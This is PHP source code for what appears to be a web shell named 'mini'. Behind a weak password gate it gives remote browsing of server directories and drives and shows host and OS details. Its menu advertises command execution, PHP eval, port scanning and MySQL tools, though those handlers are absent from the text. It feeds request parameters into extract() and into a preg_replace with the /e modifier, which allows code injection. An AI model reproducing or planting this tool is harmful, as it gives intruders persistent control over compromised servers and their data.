//<?php
run();
class project {
  static function init() {
    self::G('time');
    self::headers();
    self::G('time', 'end');
  }
 function show(){
    self::G('runtime');
    header("Content-type:text/html;charset=utf-8");
    $_GET["dir"] = !empty($_GET["dir"]) ? iconv("UTF-8", "GBK", $_GET["dir"]) : $_GET["dir"];
    $file = !empty($_GET["dir"]) ? rtrim(self::switchUrl($_GET["dir"],true),"/")."/" : sprintf("%s%s",rtrim(__ROOT__,"/"),"/");
    if (!is_readable($file)) return false;
    chdir($file);
    $file=strtolower($file);
    foreach(scandir($file) as $disk){
        if($disk==".." ||$disk == "." ) continue;
        if (is_dir($file.$disk)) $dir[] = $disk;
        elseif(is_file($file.$disk)) $files[] = $disk;
        else $disk=array();
    }
    if (!isset($dir)) $dir = array();
    if (!isset($files)) $files = array();
    foreach($dir as $i=>$gbk){
        $utf8=iconv("GBK", "UTF-8",$gbk);
        $directory[sprintf("%s%s","dir",$i)][]=$utf8;
        $directory[sprintf("%s%s","dir",$i)][]=@self::perms($file.$gbk,1);
        $directory[sprintf("%s%s","dir",$i)][]=@self::perms($file.$gbk,2);
        $directory[sprintf("%s%s","dir",$i)][]=@self::perms($file.$gbk,3);
        $directory[sprintf("%s%s","dir",$i)][]=@self::perms($file.$gbk,4);                        
    }
    unset($dir,$utf8,$gbk);
    foreach($files as $i=>$gbk){
        $utf8=iconv("GBK", "UTF-8",$gbk);
        $document[sprintf("%s%s","file",$i)][]=$utf8;
        $document[sprintf("%s%s","file",$i)][]=@self::perms($file.$gbk,1);
        $document[sprintf("%s%s","file",$i)][]=@self::perms($file.$gbk,2);
        $document[sprintf("%s%s","file",$i)][]=@self::perms($file.$gbk,3);
        $document[sprintf("%s%s","file",$i)][]=@self::perms($file.$gbk,4);   
    }
    unset($files,$utf8,$gbk);
    $return["dir"]=$directory;
    $return["dir"]["total"]=count($directory);
    $return["file"]=$document;
    $return["file"]["total"]=count($document);
    $return['ajax']=self::switchUrl(iconv("GBK", "UTF-8",$file));
    $return['back']=iconv("GBK", "UTF-8",dirname($file));
    $return['runtime']=self::G('runtime','end');
    $return['disktotal']=self::byte_format(disk_total_space($file));
    echo "json=".json_encode($return);
    unset($return);
    self::G('runtime','end');
}

static protected function perms($file, $type = '1') {
    if ($type == 1) {
      return substr(sprintf('%o', fileperms($file)), -4);
    }
    if ($type == 2) {
      return self::getperms($file);
    }
    if ($type == 3) {
      return date('Y-m-d h:i:s', filemtime($file));
    }
    if ($type == 4) {
      return is_dir($file) ? 'directory' : self::byte_format(sprintf("%u",
        filesize($file)));
    }
  }
  static protected function headers() {
    $eof = <<< HTML
<!DOCTYPE HTML>
<head>
	<meta http-equiv="content-type" content="text/html" />
    <meta http-equiv="content-type" charset="UTF-8"/>
	<meta name="author" content="Steve Smith" />
	<title>{title}</title>
    <style>
    a{color:#00f;text-decoration:underline;}a:hover{color:#f00;text-decoration:none;}body{font:12px Arial,Tahoma;line-height:16px;margin:0;padding:0;}#header{height:20px;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}#header .left{float:left;}#header .right{float:right;}#menu{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}#content{margin:0 auto;width:98%;}#content h2{margin-top:15px;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}#content #base,#content #base2{background:#eee;margin-bottom:10px;}#base input{float:right;border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;margin:5px 10px;}.cdrom{padding:5px;margin:auto 7px;}.h{margin-top:8px;}#base2 .input{font:12px Arial,Tahoma;background:#fff;border:1px solid #666;padding:2px;height:18px;}#base2 .bt{border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}dl,dt,dd{margin:0;}.focus{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}.fff{background:#fff}dl{margin:0 auto;width:100%;}dt,dd{overflow:hidden;border-top:1px solid white;border-bottom:1px solid #DDD;background:#F1F1F1;padding:5px 15px 5px 5px;}dt{border-top:1px solid white;border-bottom:1px solid #DDD;background:#E9E9E9;font-weight:bold;padding:5px 15px 5px 5px;}dt span,dd span{width:19%;display:block;float:left;font-size:14px;text-indent:0em;overflow:hidden;}#footer{padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;}#load{position:fixed;right:0;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;display:none;}.in{width:40px;text-align:center;}
    </style>
</head>
<body>
<div id="load">
loading……
</div>
<div id="header">
  <div class="left">
  {host}({ip})
  </div>
  <div class="right">
  {uname} software:{software} 
  </div>
</div>
<div id="menu">
    {menu}
</div>
<div id="content">
<h2>File Manager - Current disk free <span id="total"></span></h2>
  <div id="base">
    <div class="cdrom">
       {current} - {chmod} / {perms} 
    </div>
    <div class="cdrom">
      {cdrom}
    </div>
  </div>
  <div class="h"></div>
  <div id="base2">
    <div class="cdrom">
      {action}
    </div>
    <div class="cdrom">
      Find string in files(current folder): <input class="input" name="findstr" value="" type="text" /> <input class="bt" value="Find" type="submit" /> Type: <input class="input" name="writabledb" value="php,cgi,pl,asp,inc,js,html,htm,jsp" type="text" /><input name="dir" value="C:/freebsd/" type="hidden" /> 
    </div>
  </div>
  <div id="show">
  </div>
</div>
<div class="h"></div>
<div id="footer">
  <span style="float:right;">
     Processed in <span id="runtime">{time}</span> second(s)
  </span>
  Powered by {copyright}
  . Copyright (C) 2010-2012
   All Rights Reserved.
</div>

<script type="text/javascript">
  function $(id){
    return document.getElementById(id);
  }
 function ajax(url,type){
      top1="<dl><dt><span class=\"in\">　</span><span>Filename</span><span>Last modified</span><span>Size</span><span>Chmod / Perms</span><span>Action</span></dt><dd ><span class=\"in\">-</span><span><a href=\"javascript:void()\" onclick=\"ajax(json.back,1)\">Parent Directory</a></span><span></span><span></span><span></span><span></span></dd>";
    $("load").style.display="block";
    var xml;
    try{
    xml=new XMLHttpRequest();
   }catch(e){
    xml=new ActiveXObject("MIcrosoft.XMLHTTP");
   }
 xml.onreadystatechange=function(){
    if (4==xml.readyState){
        if(200==xml.status){
            $("show").innerHTML=top1;
            eval(xml.responseText);
           /***********************/
     $("runtime").innerHTML=json.runtime;
     $("total").innerHTML=json.disktotal;
     //if(json.file.total>100) json.file.total=100;
 for (var i=0;i<json.dir.total;i++){
      alt= i %2 ? "dd" : "fff";
      var dir=eval("json.dir.dir"+i);
      var url=json.ajax+dir[0];
      top1+="<dd class=\""+alt+"\" onmouseover=\"this.className='focus';\" onmouseout=\"this.className='"+alt+"';\"><span class=\"in\"><input name=\"dl[]\" type=\"checkbox\" value=\"\"></span><span><a href=\"javascript:void();\" name=\""+url+"\" onclick=\"ajax(this.name,1)\">"+dir[0]+"</a></span><span><a href=\"javascript:void();\">"+dir[3]+"</a></span><span>"+dir[4]+"</span><span><a href=\"javascript:void();\">"+dir[1]+"</a>/<a href=\"javascript:void();\">"+dir[2]+"</a></span><span><a href=\"\">Rename</a></span></dd>";
 }
 //if(json.file.total>100) json.file.total=100;
 for (var i=0;i<json.file.total;i++){
      alt= i %2 ? "fff" : "dd";
      var dir=eval("json.file.file"+i);
      top1+="<dd class=\""+alt+"\" onmouseover=\"this.className='focus';\" onmouseout=\"this.className='"+alt+"';\"><span class=\"in\"><input name=\"dl[]\" type=\"checkbox\" value=\"\"></span><span><a href=\"javascript:void();\" name=\"\" onclick=\"ajax(this.name,1)\">"+dir[0]+"</a></span><span><a href=\"javascript:void();\">"+dir[3]+"</a></span><span>"+dir[4]+"</span><span><a href=\"javascript:void();\">"+dir[1]+"</a>/<a href=\"javascript:void();\">"+dir[2]+"</a></span><span><a href=\"javascript:void();\">Down</a> |<a href=\"javascript:void();\">Copy</a> |<a href=\"javascript:void();\">Edit</a> |<a href=\"javascript:void();\">Rename</a></span></dd>";
 }
 $("show").innerHTML=top1;
 $("load").style.display="none";
  top1="";
/*************************/
        }
    }
 }  
    /***
     1 遍历目录 2创建文件3 创建文件夹4删除/批量删除文件(夹)5文件下载6时间修改7文件上传...8端口扫描
     *****/
    url= url ? url : '?action=show';
    if(1==type) url='?action=show|dir|'+url;
    xml.open("get",url,true);
    xml.send();
 }
 ajax();
</script>
</body>
</html>
HTML;
    $actions = array(
      'WebRoot' => self::switchUrl($_SERVER['DOCUMENT_ROOT']),
      'Create Directory' => '',
      'Create File' => '',
      );
    $menus = array(
      'Logout',
      'File Manager' => self::switchUrl($_SERVER['DOCUMENT_ROOT']),
      'MYSQL Manager' => '',
      'MySQL Upload' => '',
      'Execute Command' => '',
      'PHP Variable' => '',
      'Port Scan' => '',
      'Eval PHP Code' => '');
    $menu = '';
    $action = '';
    $logout = array_shift($menus);
    $menu .= sprintf('<a href="%s">%s</a> | ',
      '?action=logout', $logout);
    foreach ($menus as $key => $val) {
      $menu .= sprintf('<a href="javascript:void()" name="%s" onclick=ajax(this.name,1)>%s</a> | ',
        $val, $key, "\r\n");
    }
    foreach ($actions as $key => $val) {
      $action .= sprintf('<a href="javascript:void()" name="%s" onclick=ajax(this.name,1)>%s</a> | ',
        $val, $key, "\r\n");
    }
    $serach = array(
      '{title}',
      '{host}',
      '{ip}',
      '{uname}',
      '{software}',
      '{menu}',
      '{copyright}',
      '{time}',
      '{cdrom}',
      '{action}');
    $replace = array(
      title,
      $_SERVER['HTTP_HOST'],
      $_SERVER['SERVER_ADDR'],
      php_uname('s'),
      $_SERVER["SERVER_SOFTWARE"],
      trim($menu, '| '),
      copyright,
      self::G('time', 'end'),
      self::disk(),
      trim($action, '| '));
    $eof = str_replace($serach, $replace, $eof);
    echo $eof;
  }
  static protected function switchUrl($url, $type = '') {
    if (true === $type) {
      $serach = '*';
      $replace = '/';
    }
    else {
      $serach = '/';
      $replace = '*';
    }
    return str_replace($serach, $replace, $url);
  }
  static protected function explode_path($url) {
    if (substr_count($url, '/') !== 1) {
      $path = explode('/', $url);
      array_pop($path);
      foreach ($path as $i => $v) {
        $u .= $v . "*";
        $paths .= sprintf('<a href="javascript:void()" name="%s" onclick="%s">%s</a> ',
          (true === is_win) ? trim(self::switchUrl(iconv('GBK', 'UTF-8', $u)),
          "*") : "*" . trim(self::switchUrl(iconv('GBK', 'UTF-8', $u)), "*"),
          'ajax(this.name,1)', iconv('GBK', 'UTF-8', $v));
      }
    }
    return $paths;
  }
  static protected function disk() {
    if (is_win) {
      $cdrom = range('A', 'Z');
      foreach ($cdrom as $disk) {
        $disk = sprintf("%s%s", $disk, ':');
        if (is_readable($disk)) {
          $return .= sprintf('<a href="javascript:void()" name="%s" onclick="ajax(this.name,1)">disk %s</a> | ',
            $disk, $disk);
        }
      }
      return trim($return, "| ");
    }
    else {
      $cdrom = scandir('/');
      foreach ($cdrom as $disk) {
        if ($disk == '.' || $disk == '..') continue;
        $disk = sprintf("%s%s", '/', $disk);
        if (is_readable($disk)) {
          if (is_dir($disk)) $return .= sprintf('<a href="javascript:void()" name="%s" onclick="ajax(this.name,1)">%s</a> | ',
              self::switchUrl($disk), str_replace('/', '', $disk));
        }
      }
      return trim($return, "| ");
    }
  }
  static function G($start, $end = '', $dec = 6) {
    static $_info = array();
    if (is_float($end)) { // 记录时间
      $_info[$start] = $end;
    }
    elseif (!empty($end)) { // 统计时间
      if (!isset($_info[$end])) $_info[$end] = microtime(true);
      return number_format(($_info[$end] - $_info[$start]), $dec);
    }
    else { // 记录时间
      $_info[$start] = microtime(true);
    }
  }
  static protected function authentication() {
    if (true == password) {
      //if(!empty($_POST['pwd']) && !preg_match('/^[a-z0-9]+$/',$_POST['pwd'])) exit;
      if (strlen(password) == 32) $password = hash(crypt, $_POST['pwd']);
      else  $password = $_POST['pwd'];
      if (isset($password) && $password == password) {
        setcookie('verify', $password, time() + 3600);
        self::reload();
      }
      if (!isset($_COOKIE['verify']) || empty($_COOKIE['verify']) || (string )$_COOKIE['verify']
        !== password) {
        self::login();
        exit;
      }
    }
  }
  public function logout() {
    setcookie('verify', '', time() - 3600);
    self::reload();
  }
  static protected function reload() {
    header("Location:" . self);
  }
  static protected function login() {
    $login=<<<LOGIN
         <!DOCTYPE HTML>
         <head>
	     <meta http-equiv="content-type" content="text/html" />
   	     <meta name="author" content="Steve Smith" />
         <meta http-equiv="content-type" charset="UTF-8" />
	     <style type="text/css">
	     input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
	    </style>
   	    <title>{title}</title>
        </head>
        <body>
	   <form method="POST" action="">
       <span style="font:11px Verdana;">Password: </span><input id="pwd" name="pwd" type="password" size="20">
       <input id="login" type="submit" value="Login">
        </form>
       </body>
       </html>
LOGIN;
    echo str_replace('{title}',title,$login);
  }
  static function despatcher() {
    self::authentication();
    global $path;
    extract($_GET);
    $url = isset($action) ? strtolower(trim($action, __PATH__)) : 'init';
    //分析多个参数
    if (strpos($url, __PATH__)) {
      $paths = explode(__PATH__, $url);
      $path = array_shift($paths);
      unset($url);
    }
    if (count($paths) > 1) {
      @preg_replace('@(\w+)\/([^\/]+)@ies', '$var[\'\\1\']=\'\\2\'', join('/', $paths));
      $get = isset($var) ? $var : array(); //避免参数错误
      $_GET = array_merge($_GET, $get);
    }
    $path = isset($path) ? $path : $url;
    //if(!method_exists(__class__,$path)) return false;
    //call_user_func(array(__class__,$path));
    return;
  }
  static protected function getperms($path) {
    $perms = fileperms($path);
    if (($perms & 0xC000) == 0xC000) {
      $info = 's';
    }
    elseif (($perms & 0xA000) == 0xA000) {
      $info = 'l';
    }
    elseif (($perms & 0x8000) == 0x8000) {
      $info = '-';
    }
    elseif (($perms & 0x6000) == 0x6000) {
      $info = 'b';
    }
    elseif (($perms & 0x4000) == 0x4000) {
      $info = 'd';
    }
    elseif (($perms & 0x2000) == 0x2000) {
      $info = 'c';
    }
    elseif (($perms & 0x1000) == 0x1000) {
      $info = 'p';
    }
    else {
      $info = '?????????';
      return $info;
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms &
      0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms &
      0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms &
      0x0200) ? 'T' : '-'));
    return $info;
  }
  static protected function byte_format($size, $dec = 2) {
    $a = array(
      "B",
      "KB",
      "MB",
      "GB",
      "TB",
      "PB");
    $pos = 0;
    while ($size >= 1024) {
      $size /= 1024;
      $pos++;
    }
    return round($size, $dec) . "" . $a[$pos];
  }
}
function run(){
if(!defined(password)) define('password','');
if(!defined(title)) define('title','mini');
if(!defined(copyright)) define('copyright', 'E');
define('self',$_SERVER["SCRIPT_NAME"]);
define('crypt', 'ripemd128');
define('__ROOT__', $_SERVER["DOCUMENT_ROOT"]);
define('is_win','win' == substr(strtolower(PHP_OS),0,3));
define('__PATH__', '|');
date_default_timezone_set('asia/shanghai');
project::despatcher();
global $path;
if (!is_callable(array('project', $path))) return false;
if (!method_exists('project', $path)) return false;
call_user_func(array('project', $path));
}
//?>